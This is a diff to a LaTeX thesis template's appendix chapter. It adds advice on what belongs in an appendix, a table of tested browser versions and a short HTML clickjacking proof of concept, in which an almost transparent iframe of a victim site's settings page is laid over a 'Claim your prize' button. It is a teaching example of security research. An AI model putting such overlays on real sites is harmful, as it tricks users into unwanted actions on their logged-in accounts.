@@ -1,2 +1,37 @@
-\chapter{Java Code} \label{chap:javacode}
+\chapter{Supplementary Material} \label{chap:appendix}
 
+Use the appendix for material that supports your thesis but would interrupt the main text, for example, long listings, complete result tables, or questionnaires.
+Everything that is necessary to follow your argument belongs in the main text.
+Reference every part of the appendix from the main text at least once, for example: \enquote{The tested browser versions are listed in \autoref{tab:versions}, and \autoref{lst:poc} shows the proof of concept.}
+
+\section{Test Setup}
+
+\begin{table}[htbp]
+    \centering
+    \caption{Browsers used in the evaluation.}
+    \label{tab:versions}
+    \begin{tabular}{@{}llll@{}}
+      \toprule
+      Browser & Version & Engine & Operating System \\
+      \midrule
+      Firefox & 145.0 & Gecko & Ubuntu 24.04 \\
+      Chrome & 142.0 & Blink & Ubuntu 24.04 \\
+      Safari & 26.1 & WebKit & macOS 26 \\
+      \bottomrule
+    \end{tabular}
+\end{table}
+
+\section{Proof of Concept}
+
+\begin{listing}[htbp]
+\begin{minted}{html}
+<style>
+  iframe { position: absolute; top: 0; left: 0; opacity: 0.01; }
+  button { position: absolute; top: 310px; left: 120px; }
+</style>
+<button>Claim your prize</button>
+<iframe src="https://victim.example/settings" width="800" height="600"></iframe>
+\end{minted}
+\caption{Clickjacking proof of concept: the invisible frame is placed above the button.}
+\label{lst:poc}
+\end{listing}
